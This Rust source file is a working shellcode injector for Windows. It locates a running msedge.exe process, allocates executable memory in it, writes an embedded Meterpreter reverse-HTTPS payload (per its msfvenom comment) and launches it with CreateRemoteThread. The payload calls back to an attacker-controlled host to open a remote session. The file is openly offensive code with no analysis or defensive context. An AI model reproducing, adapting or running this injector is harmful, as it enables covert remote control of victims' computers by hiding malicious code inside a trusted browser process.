use std::convert::TryFrom;
use sysinfo::{ProcessExt, System, SystemExt};

use std::ptr;
use windows::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread};
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::Foundation::CloseHandle;


fn process_hunter() -> u32 {
    // search for msedge.exe PID. If multiple msedge.exe instances are running, it returns the first one it gets.
    let s = System::new_all();
    let target = s.get_process_by_name("msedge.exe")[0];
    let target_pid: u32 = u32::try_from(target.pid()).unwrap();

    return target_pid;
}

fn main() {

    // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.101 LPORT=443 EXITFUNC=thread -f csharp
    let shellcode: [u8; 805] = [
        0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48,
0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x4d,0x31,0xc9,0x48,
0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,
0x31,0x36,0x35,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
0x00,0x00,0x00,0xff,0xd5,0xe8,0xfb,0x00,0x00,0x00,0x2f,0x44,0x62,0x33,0x63,
0x52,0x4b,0x64,0x69,0x64,0x69,0x57,0x4d,0x32,0x49,0x33,0x61,0x37,0x70,0x68,
0x4e,0x54,0x51,0x54,0x7a,0x6e,0x54,0x6e,0x71,0x4c,0x4e,0x53,0x7a,0x7a,0x4a,
0x56,0x4f,0x30,0x55,0x6c,0x58,0x45,0x34,0x4f,0x30,0x5f,0x4d,0x74,0x6e,0x69,
0x57,0x42,0x63,0x54,0x56,0x76,0x6f,0x47,0x6b,0x46,0x34,0x36,0x4f,0x4a,0x35,
0x34,0x76,0x36,0x33,0x4b,0x2d,0x4a,0x69,0x57,0x45,0x43,0x57,0x78,0x36,0x4e,
0x4d,0x44,0x48,0x55,0x54,0x7a,0x59,0x31,0x59,0x68,0x61,0x68,0x52,0x4b,0x68,
0x71,0x69,0x78,0x48,0x51,0x6d,0x30,0x31,0x42,0x6a,0x36,0x34,0x56,0x52,0x31,
0x74,0x77,0x69,0x35,0x39,0x75,0x4f,0x74,0x6d,0x57,0x41,0x6c,0x54,0x59,0x46,
0x6f,0x56,0x73,0x57,0x4b,0x30,0x77,0x6e,0x70,0x31,0x31,0x62,0x41,0x71,0x30,
0x78,0x31,0x54,0x79,0x6f,0x55,0x63,0x71,0x4f,0x63,0x44,0x46,0x4c,0x56,0x43,
0x6b,0x6c,0x72,0x79,0x33,0x74,0x51,0x37,0x4e,0x63,0x77,0x6b,0x4d,0x59,0x57,
0x72,0x64,0x79,0x46,0x51,0x34,0x77,0x55,0x41,0x53,0x73,0x30,0x79,0x51,0x53,
0x77,0x30,0x77,0x37,0x36,0x30,0x43,0x4d,0x31,0x4a,0x64,0x5f,0x5a,0x49,0x62,
0x4a,0x30,0x69,0x4f,0x4b,0x43,0x76,0x6f,0x4d,0x70,0x4a,0x66,0x75,0x4f,0x43,
0x6b,0x48,0x36,0x50,0x79,0x6c,0x76,0x4b,0x45,0x63,0x6e,0x42,0x46,0x61,0x32,
0x32,0x58,0x6b,0x5f,0x4b,0x57,0x76,0x6c,0x77,0x67,0x31,0x6d,0x63,0x35,0x51,
0x6b,0x55,0x30,0x55,0x4f,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,
0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,
0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,
0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,
0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,
0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,
0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,
0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,
0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,
0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,
0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,
0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,
0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,
0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,
0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,
0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5,
    ];

    let target_pid: u32 = process_hunter();
    println!("Targeting {}", target_pid);

    unsafe {
        let h = OpenProcess(
            PROCESS_ALL_ACCESS, 
            false, 
            target_pid
        );

        let addr = VirtualAllocEx(
            h,
            ptr::null_mut(),
            shellcode.len(), 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );

        let mut n = 0;
        WriteProcessMemory(
            h, 
            addr, 
            shellcode.as_ptr() as _, 
            shellcode.len(),
            &mut n
        );

        let _h_thread = CreateRemoteThread(
            h, 
            ptr::null_mut(), 
            0, 
            Some(std::mem::transmute(addr)),
            ptr::null_mut(),
            0, 
            ptr::null_mut()
        );

        CloseHandle(h);
    }
}